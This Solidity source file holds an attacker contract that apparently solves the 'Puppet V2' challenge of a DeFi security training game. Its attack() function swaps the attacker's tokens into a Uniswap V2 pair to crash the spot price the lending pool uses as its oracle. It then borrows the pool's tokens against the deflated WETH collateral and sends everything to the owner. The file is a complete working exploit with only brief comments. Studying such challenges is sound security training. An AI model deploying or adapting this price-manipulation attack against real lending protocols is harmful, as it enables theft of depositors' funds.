// SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.0;

interface IUniswapV2Router {
    function tokenAddress() external view returns(address);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
    function WETH() external pure returns (address);
}

interface IPuppetV2Pool {
    function uniswapPair() external view returns(address);
    function token() external view returns(address);
    function borrow(uint256) external payable;
    function calculateDepositOfWETHRequired(uint256 amount) external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns(uint256);
    function approve(address,uint256) external returns(bool);
    function transfer(address,uint256) external returns(bool);
    function transferFrom(address,address,uint256) external returns(bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

contract PuppetV2Attacker {

    address immutable owner;
    IUniswapV2Router immutable router;
    IPuppetV2Pool immutable lendingPool;
    IERC20 immutable token;

    constructor(address _router, address _lendingPool, address _token) {
        owner = msg.sender;
        router = IUniswapV2Router(_router);
        lendingPool = IPuppetV2Pool(_lendingPool);
        token = IERC20(_token);
    }
    
    function attack() external payable {
        // msg.sender must have sent DVT to this contract before atacking
        uint256 balance =  token.balanceOf(address(this));
        require(balance > 0, "Attacker forgot to send DVT to the contract.");
        require(address(this).balance > 0, "Attacker forgot to send ETH to the contract.");
        token.approve(address(router), balance);

        IWETH weth = IWETH(router.WETH());

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        router.swapExactTokensForETH(
            balance,
            1,
            path,
            address(this),
            block.timestamp
        );

        // Transform our ETH in WETH
        weth.deposit{value: address(this).balance}();
        
        uint256 wethBalance = weth.balanceOf(address(this));

        // Get price for 1 token from the lending pool
        uint256 price = lendingPool.calculateDepositOfWETHRequired(1 ether);
        
        // Compute how much we can get with our current balance
        uint256 maxCurrent = wethBalance * 10**18 / price;
        uint256 lendingPoolBalance = token.balanceOf(address(lendingPool));
        
        // Get as much as possible for the price
        uint256 maxBorrowable = maxCurrent < lendingPoolBalance ? maxCurrent : lendingPoolBalance;
        weth.approve(address(lendingPool), wethBalance);

        lendingPool.borrow(maxBorrowable);

        // Give everything back to the attacker
        token.transfer(owner, token.balanceOf(address(this)));
        weth.withdraw(weth.balanceOf(address(this)));
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable{}
}